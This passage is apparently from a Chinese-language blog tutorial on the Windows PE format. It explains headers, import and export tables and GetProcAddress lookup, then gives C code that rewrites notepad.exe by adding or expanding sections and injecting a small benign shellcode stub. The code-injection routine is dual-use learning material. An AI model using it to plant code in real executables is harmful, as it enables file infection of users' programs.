*PIMAGE_OPTIONAL_HEADER32</span><br></pre></td></tr></table></figure><ul><li><p>Magic</p><ul><li>32位为0x10B，64位为0x20B</li></ul></li><li><p>AddressOfEntryPoint</p><ul><li>RVA值，程序入口点</li></ul></li><li><p>ImageBase</p><ul><li>PE文件被加载到内存地址，加载完后，EIP指向ImageBase+AddressOfEntryPoint</li></ul></li><li><p>SizeOfImage</p><ul><li>PE文件装载到虚拟内存后的大小</li></ul></li><li><p>SizeOfHeaders</p><ul><li>PE头按照FileAlignment对齐后的大小，包括section head</li></ul></li><li><p>Subsystem</p><ul><li>区分系统文件和普通可执行文件</li><li>系统驱动：drive 窗口：GUI 控制台：CUI 等</li></ul></li><li><p>NumberOfRvaAndSizes</p><ul><li>DataDirectory数目</li></ul></li><li><p>DataDirectory</p><ul><li><table><thead><tr><th>数据目录项</th><th>索引位置</th></tr></thead><tbody><tr><td>导出表（Export Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> (0)</td></tr><tr><td>导入表（Import Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_IMPORT</code> (1)</td></tr><tr><td>资源表（Resource Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_RESOURCE</code> (2)</td></tr><tr><td>异常表（Exception Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_EXCEPTION</code> (3)</td></tr><tr><td>安全表（Security Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_SECURITY</code> (4)</td></tr><tr><td>重定位表（Base Relocation Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_BASERELOC</code> (5)</td></tr><tr><td>调试表（Debug Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_DEBUG</code> (6)</td></tr><tr><td>版本信息（Version Information）</td><td><code>IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</code> (7)</td></tr><tr><td>全局指针（Global Pointer）</td><td><code>IMAGE_DIRECTORY_ENTRY_GLOBALPTR</code> (8)</td></tr><tr><td>TLS表（Thread Local Storage Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_TLS</code> (9)</td></tr><tr><td>载入配置表（Load Configuration Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</code> (10)</td></tr><tr><td>绑定导入表（Bound Import Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</code> (11)</td></tr><tr><td>IAT表（Import Address Table）</td><td><code>IMAGE_DIRECTORY_ENTRY_IAT</code> (12)</td></tr><tr><td>延迟导入描述符（Delay Import Descriptor）</td><td><code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code> (13)</td></tr><tr><td>COM运行时描述符（COM Runtime Descriptor）</td><td><code>IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</code> (14)</td></tr><tr><td>保留（Reserved）</td><td><code>IMAGE_DIRECTORY_ENTRY_RESERVED</code> (15)</td></tr></tbody></table></li></ul></li></ul><h3 id="节区头"><a href="#节区头" class="headerlink" title="节区头"></a>节区头</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];   <span class="comment">// 节名称，最多8个字符（如果名称长度不足8个字符，用空格填充）。</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   PhysicalAddress;              <span class="comment">// 在物理地址的上下文中使用的节的物理地址。</span></span><br><span class="line">        DWORD   VirtualSize;                  <span class="comment">// 在内存中分配给节的虚拟大小。</span></span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                   <span class="comment">// 节的虚拟地址（相对于映像基址的偏移量）。</span></span><br><span class="line">    DWORD   SizeOfRawData;                     <span class="comment">// 节的在文件中占用的大小（以字节为单位）。</span></span><br><span class="line">    DWORD   PointerToRawData;                  <span class="comment">// 节在文件中的偏移量。</span></span><br><span class="line">    DWORD   PointerToRelocations;              <span class="comment">// 重定位表的文件偏移量。</span></span><br><span class="line">    DWORD   PointerToLinenumbers;              <span class="comment">// 行号表的文件偏移量。</span></span><br><span class="line">    WORD    NumberOfRelocations;               <span class="comment">// 重定位项的数量。</span></span><br><span class="line">    WORD    NumberOfLinenumbers;               <span class="comment">// 行号项的数量。</span></span><br><span class="line">    DWORD   Characteristics;                   <span class="comment">// 节的特性标志。</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>RAW(文件偏移)&#x3D;RVA-VirtualAddress+PointerToRawData</p><blockquote><p>这个换算有时候是不对的，比如说有未初始化初始的数据节，为了节约磁盘空间，VirtualSize比SizeOfRawData要大，换算后节区会不一样、</p></blockquote><p>PE头内的话 RAW&#x3D;RVA</p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p>_IMAGE_OPTIONAL_HEADER里DataDirectory的第二项，导入多少个库就有多少个_IMAGE_IMPORT_DESCRIPTOR结构，最后以一个空结构体结尾</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p><strong>以notepad为例</strong></p><p>&gt;&gt;&gt;<strong>Name</strong></p><p>就是当前模块依赖模块名字</p><p><img src="/2023/05/19/PE-FILE/image-20230519163927062.png" alt="image-20230519163927062"></p><p>0x7604是RVA</p><p><img src="/2023/05/19/PE-FILE/image-20230519164252693.png" alt="image-20230519164252693"></p><p>可以看出0x7604他在第一个section(PE文件的section相比于ELF很少)</p><p>RAW&#x3D;RVA-VirtualAddress+PointerToRawData&#x3D;0x7604-0x1000+0x400&#x3D;0x6A04</p><p><img src="/2023/05/19/PE-FILE/image-20230519164805090.png" alt="image-20230519164805090"></p><p>他的name字段就是0x7AAC，同样位于第一个节区RAW&#x3D;0x7AAC-0x1000+0x400&#x3D;0x6EAC</p><p><img src="/2023/05/19/PE-FILE/image-20230519164941785.png" alt="image-20230519164941785"></p><p><img src="/2023/05/19/PE-FILE/image-20230519165226573.png" alt="image-20230519165226573"></p><p><strong>他的OriginalFirstThunk和FirstThunk分别指向INT(Import Name Table ，导入名称表) 和IAT（Import Address Table ，导入地址表）</strong></p><p>&gt;&gt;&gt;<strong>OriginalFirstThunk:INT表</strong>(导入名称表)</p><p>指向_IMAGE_THUNK_DATA32数组的RVA</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// 指向转发字符串的指针（PBYTE）。</span></span><br><span class="line">        DWORD Function;             <span class="comment">// 指向函数地址的指针（PDWORD）。</span></span><br><span class="line">        DWORD Ordinal;              <span class="comment">// 导入函数的序号（用于按序号导入）。</span></span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// 指向 IMAGE_IMPORT_BY_NAME 结构的指针（PIMAGE_IMPORT_BY_NAME）。</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;       <span class="comment">// 函数名称的提示（用于加速导入的查找过程）。</span></span><br><span class="line">    CHAR   Name[<span class="number">1</span>];    <span class="comment">// 函数名称（以NULL结尾的ASCII字符串）。</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><blockquote><p>u1的最高位为1，去除这个1，其余就是导入函数的序号Ordinal，否则就是AddressOfData</p></blockquote><p><img src="/2023/05/19/PE-FILE/image-20230519171519020.png" alt="image-20230519171519020"></p><p>RAW&#x3D;0x6D90 0x6D90处就是_IMAGE_THUNK_DATA32数组，同样以NULL结构体结尾</p><p><img src="/2023/05/19/PE-FILE/image-20230519172810749.png" alt="image-20230519172810749"></p><p>RVA&#x3D;0x7A7A RAW&#x3D;0x6E7A，指向_IMAGE_IMPORT_BY_NAME结构体</p><p><img src="/2023/05/19/PE-FILE/image-20230519172307227.png" alt="image-20230519172307227"></p><p>0xF为库中函数序号，后面是导入函数名称</p><p>后面0x7a5e RAW为0x6e50</p><p><img src="/2023/05/19/PE-FILE/image-20230519172921483.png" alt="image-20230519172921483"></p><p>&gt;&gt;&gt;<strong>FirstThunk:IAT表</strong>(导入地址表)</p><p>同样是指向_IMAGE_THUNK_DATA32数组的RVA</p><p><img src="/2023/05/19/PE-FILE/image-20230519174316053.png" alt="image-20230519174316053"></p><p>RAW为0x6c4</p><p><img src="/2023/05/19/PE-FILE/image-20230519174410251.png" alt="image-20230519174410251"></p><p>一堆不明所以的数据</p><p>丢到x32dbg看看</p><blockquote><p>由于可执行文件PE是是进程第一个加载的模块，所以他几乎百分百都能抢到他原来的imagebase(除了开了aslr的情况)，不需要去做重定位，所以这个IAT地址直接就是RVA+ImageBase</p></blockquote><p>RVA+ImageBase&#x3D;0x10012c4</p><p><img src="/2023/05/19/PE-FILE/image-20230519180741267.png" alt="image-20230519180741267"></p><p><img src="/2023/05/19/PE-FILE/image-20230519181813832.png" alt="image-20230519181813832"></p><p>0x77243e60这个地址就是PageSetupDlgw导入函数地址</p><p><img src="/2023/05/19/PE-FILE/image-20230519181542374.png" alt="image-20230519181542374"></p><p><img src="/2023/05/19/PE-FILE/image-20230519180449954.png" alt="image-20230519180449954"></p><p>类似于ELF里的got表,调用这种导入函数时是一个间接调用call *(iat)</p><h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>_IMAGE_OPTIONAL_HEADER里DataDirectory的第一项，导出表只有一个</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;        <span class="comment">// 导出表的特性标志。</span></span><br><span class="line">    DWORD   TimeDateStamp;          <span class="comment">// 导出表的时间戳。</span></span><br><span class="line">    WORD    MajorVersion;           <span class="comment">// 导出表的主要版本号。</span></span><br><span class="line">    WORD    MinorVersion;           <span class="comment">// 导出表的次要版本号。</span></span><br><span class="line">    DWORD   Name;                   <span class="comment">// 模块名称的 RVA（相对虚拟地址）。</span></span><br><span class="line">    DWORD   Base;                   <span class="comment">// 导出函数的起始序号。</span></span><br><span class="line">    DWORD   NumberOfFunctions;      <span class="comment">// 导出函数的数量。</span></span><br><span class="line">    DWORD   NumberOfNames;          <span class="comment">// 导出函数名称的数量。</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// 导出函数地址表的 RVA（相对虚拟地址）。</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// 导出函数名称表的 RVA（相对虚拟地址）。</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// 导出函数序号表的 RVA（相对虚拟地址）。</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><blockquote><p>NumberOfFunctions函数，导出时不按序号顺序导出，空余位也计入，比如1，5，2，3 但是NumberOfFunctions&#x3D;5</p><p>所以就需要导出函数序号表的将函数地址和名称联系起来</p><p>导出函数可以没有名字但是一定要有序号</p></blockquote><p>看一下GetProcAddress是如何解析的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FARPROC <span class="title function_">GetProcAddress</span><span class="params">(HMODULE hModule ,LPCWSTR lpPro0cName)</span></span><br></pre></td></tr></table></figure><h4 id="lpPro0cName参数是name时（大于-0x10000）"><a href="#lpPro0cName参数是name时（大于-0x10000）" class="headerlink" title="lpPro0cName参数是name时（大于 0x10000）"></a>lpPro0cName参数是name时（大于 0x10000）</h4><ul><li>根据AddressOfNames的RVA找到导出函数名称表(里面时字符串指针的RVA)，利用strcmp比较字符串，找到名称，并记录下该名称在导出函数名称表的named_index，名称表里的指针指向的名字都是A-Za-z排序好的，按照朴素的二分法效率蛮高的 毕竟最多log2(n) 次嘛:)</li><li>AddressOfNameOrdinals找到导出函数序号表，根据named_index找到对应的orinal</li><li>AddressOfFunctions找到导出函数地址表的(EAT  Export Address Table)，根据orinal找到函数的RVA</li></ul><h4 id="lpPro0cName参数是序号时（小于-0x10000）"><a href="#lpPro0cName参数是序号时（小于-0x10000）" class="headerlink" title="lpPro0cName参数是序号时（小于 0x10000）"></a>lpPro0cName参数是序号时（小于 0x10000）</h4><ul><li>序号减去Base（起始序号）得到index</li><li>根据index去函数地址表去找</li></ul><h2 id="some-opertion-about-pe"><a href="#some-opertion-about-pe" class="headerlink" title="some opertion about pe"></a>some opertion about pe</h2><p>main.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;init.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NAME <span class="string">&quot;C:\\Users\\zbx\\Desktop\\notepad.exe&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEWNAME <span class="string">&quot;new.exe&quot;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">18</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xE8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xE9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">size_t</span> size = <span class="number">18</span>;</span><br><span class="line">DWORD AddNewSectionSize=<span class="number">0x1000</span>;</span><br><span class="line">DWORD ExpandSectionSize = <span class="number">0x1000</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//*********FiletoImageToFile********</span></span><br><span class="line">    <span class="comment">/*void* Filebuffer;</span></span><br><span class="line"><span class="comment">    void* Imagebuffer;</span></span><br><span class="line"><span class="comment">    void* Newfilebuffer;</span></span><br><span class="line"><span class="comment">    size_t size;</span></span><br><span class="line"><span class="comment">    size = PeCopyToFilebuffer(NAME, &amp;Filebuffer);</span></span><br><span class="line"><span class="comment">    FileToImage(Filebuffer, &amp;Imagebuffer);</span></span><br><span class="line"><span class="comment">    ImageToFile(Imagebuffer, &amp;Newfilebuffer);</span></span><br><span class="line"><span class="comment">    FilebufferCopytoPe(NEWNAME, size, Newfilebuffer);</span></span><br><span class="line"><span class="comment">    free(Filebuffer);</span></span><br><span class="line"><span class="comment">    free(Imagebuffer);</span></span><br><span class="line"><span class="comment">    free(Newfilebuffer);</span></span><br><span class="line"><span class="comment">    printf(&quot;get a new one &quot;);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//********GetMessageBoxA********</span></span><br><span class="line">    <span class="comment">/*size_t size;</span></span><br><span class="line"><span class="comment">    void* filebuffer = NULL;</span></span><br><span class="line"><span class="comment">    size = PeCopyToFilebuffer(NAME, &amp;filebuffer);</span></span><br><span class="line"><span class="comment">    AddShellcode(filebuffer);</span></span><br><span class="line"><span class="comment">    FilebufferCopytoPe(NEWNAME, size, filebuffer);</span></span><br><span class="line"><span class="comment">    free(filebuffer);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//********AddANewSection*********</span></span><br><span class="line">    <span class="comment">/*void* filebuffer=NULL;</span></span><br><span class="line"><span class="comment">    void* newfilebuffer=NULL;</span></span><br><span class="line"><span class="comment">    size_t size = 0;</span></span><br><span class="line"><span class="comment">    size_t newsize = 0;</span></span><br><span class="line"><span class="comment">    size=PeCopyToFilebuffer(NAME,&amp;filebuffer);</span></span><br><span class="line"><span class="comment">    newsize =AddANewSection(filebuffer,size,&amp;newfilebuffer);</span></span><br><span class="line"><span class="comment">    FilebufferCopytoPe(NEWNAME,newsize,newfilebuffer);</span></span><br><span class="line"><span class="comment">    free(filebuffer);</span></span><br><span class="line"><span class="comment">    free(newfilebuffer);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//***********ExpandTheLastSection*********</span></span><br><span class="line">    <span class="type">void</span>* filebuffer=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">void</span>* newfilebuffer=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> newsize = <span class="number">0</span>;</span><br><span class="line">    size=PeCopyToFilebuffer(NAME,&amp;filebuffer);</span><br><span class="line">    newsize = ExpandTheLastSection(filebuffer,size,&amp;newfilebuffer);</span><br><span class="line">    FilebufferCopytoPe(NEWNAME,newsize,newfilebuffer);</span><br><span class="line">    <span class="built_in">free</span>(filebuffer);</span><br><span class="line">    <span class="built_in">free</span>(newfilebuffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>init.h</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _FileToimagetofile</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _FileTOimagetofile</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line">DWORD <span class="title function_">PeCopyToFilebuffer</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, OUT <span class="type">void</span>** pointer)</span>;</span><br><span class="line">DWORD <span class="title function_">FileToImage</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Filept, OUT <span class="type">void</span>** Imagept)</span>;</span><br><span class="line">DWORD <span class="title function_">ImageToFile</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Imagept, OUT <span class="type">void</span>** Filept)</span>;</span><br><span class="line">DWORD <span class="title function_">FilebufferCopytoPe</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span>* Filept)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">AddANewSection</span><span class="params">(IN <span class="type">void</span> *filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer,OUT <span class="type">void</span> **newfilebuffer)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AddShellcode</span><span class="params">(IN <span class="type">void</span>* filebuffer)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ExpandTheLastSection</span><span class="params">(IN <span class="type">void</span> * filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer,OUT <span class="type">void</span> **newfilebuffer)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>init.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;init.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG 0</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> shellcode[<span class="number">18</span>];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> size;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> size;</span><br><span class="line"><span class="keyword">extern</span> DWORD AddNewSectionSize;</span><br><span class="line"><span class="keyword">extern</span> DWORD ExpandSectionSize;</span><br><span class="line">DWORD <span class="title function_">PeCopyToFilebuffer</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, OUT <span class="type">void</span>** pointer)</span> &#123;</span><br><span class="line">    FILE* PE = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">void</span>* Filebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    DWORD fin;</span><br><span class="line">    PE = fopen(name, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == PE) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;file open PE %s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fseek(PE, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    size = ftell(PE);</span><br><span class="line">    Filebuffer = <span class="built_in">malloc</span>(size);</span><br><span class="line">    fseek(PE, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    fread(Filebuffer, size, <span class="number">1</span>, PE);</span><br><span class="line">    *pointer = Filebuffer;</span><br><span class="line">    Filebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    fclose(PE);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">FileToImage</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Filept, OUT <span class="type">void</span>** Imagept)</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER PimageDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeads = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PimageDosHeader = (PIMAGE_DOS_HEADER)Filept;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PimageDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeads = (PIMAGE_NT_HEADERS)((<span class="type">char</span>*)Filept + PimageDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)PNtHeads != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)Filept + PimageDosHeader-&gt;e_lfanew + PNtHeads-&gt;FileHeader.SizeOfOptionalHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="number">4</span>);<span class="comment">//pe头包括标准头（FILEHEADER），可选pe头（OPTIONHEADER）和四个字节的PE标识；</span></span><br><span class="line">    <span class="type">void</span>* PImagetemp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = PNtHeads-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">    PImagetemp = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(PImagetemp, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">memcpy</span>(PImagetemp, Filept, PNtHeads-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeads-&gt;FileHeader.NumberOfSections; i++, PSectionHeader++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;FileToImage%x\n&quot;</span>, PSectionHeader-&gt;VirtualAddress);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)((<span class="type">char</span>*)PImagetemp + PSectionHeader-&gt;VirtualAddress), (<span class="type">void</span>*)((<span class="type">char</span>*)Filept + PSectionHeader-&gt;PointerToRawData), PSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">    &#125;</span><br><span class="line">    *Imagept = PImagetemp;</span><br><span class="line">    PImagetemp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> PNtHeads-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">&#125;</span><br><span class="line">DWORD <span class="title function_">ImageToFile</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Imagept, OUT <span class="type">void</span>** Filept)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* Filebuffer;</span><br><span class="line">    PIMAGE_DOS_HEADER PimageDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeads = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PimageDosHeader = (PIMAGE_DOS_HEADER)Imagept;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PimageDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeads = (PIMAGE_NT_HEADERS)((<span class="type">char</span>*)Imagept + PimageDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)PNtHeads != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)Imagept + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PimageDosHeader-&gt;e_lfanew + PNtHeads-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">    size = PNtHeads-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">    PIMAGE_SECTION_HEADER tempPsection = PSectionHeader;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeads-&gt;FileHeader.NumberOfSections; ++tempPsection, ++i) &#123;</span><br><span class="line">        size += tempPsection-&gt;SizeOfRawData;</span><br><span class="line">    &#125;</span><br><span class="line">    Filebuffer = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(Filebuffer, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">memcpy</span>(Filebuffer, Imagept, PNtHeads-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeads-&gt;FileHeader.NumberOfSections; ++PSectionHeader, ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ImageToFile%x\n&quot;</span>, PSectionHeader-&gt;PointerToRawData);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)((<span class="type">char</span>*)Filebuffer + 